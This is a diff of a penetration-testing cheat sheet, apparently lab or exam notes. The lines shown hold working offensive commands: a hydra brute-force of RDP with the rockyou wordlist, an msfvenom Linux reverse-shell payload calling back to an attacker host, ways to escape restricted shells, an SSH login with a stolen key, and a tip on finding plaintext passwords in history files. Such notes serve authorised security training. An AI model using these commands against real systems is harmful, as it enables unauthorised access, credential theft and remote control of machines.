@@ -2867,10 +2867,9 @@ hydra -t 1 -V -f -l administrator -P Desktop/rockyou.txt rdp://192.168.100.55
 
 
 ```
-#MSFVENOM
+# MSFVENOM
 
-# Linux reverse shell
-	msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell.exe LHOST=192.168.45.246 LPORT=445
+	Linux reverse shell: msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell.exe LHOST=192.168.45.246 LPORT=445
 
  # Common Errors And Workarounds
 
@@ -2882,4 +2881,22 @@ hydra -t 1 -V -f -l administrator -P Desktop/rockyou.txt rdp://192.168.100.55
 Folder Is not writable
 	Solution: Move to /tmp
 
+ "Connection closed by 192.168.200.107 port 22"
+ 	If you receive this with a known id_rsa or password, then most likely the user you are connecting to does not actually exist
+
+ # Breaking Out Of Restricted Shells
+
+ 	1) Copy /bin/bash to current directory, run bash again, you should have escaped
+  		cp /bin/bash .
+    		./bash
+  	2) Use python to spawn a /bin/bash subprocess
+   		python -c 'import os; os.system("/bin/sh")'
+   	3) Reconnecting to server with no profile
+    		ssh -o StrictHostKeyChecking=no -i id_rsa tom@192.168.120.138 -t "bash --noprofile"
+
+# Random Tips
+
+	1) Always check history files. .sql_history files can contain passwords, although they are formatted kind of like this:
+ 		insert\040into\040support\040(tom,\040xx11yy22!);
+	
  
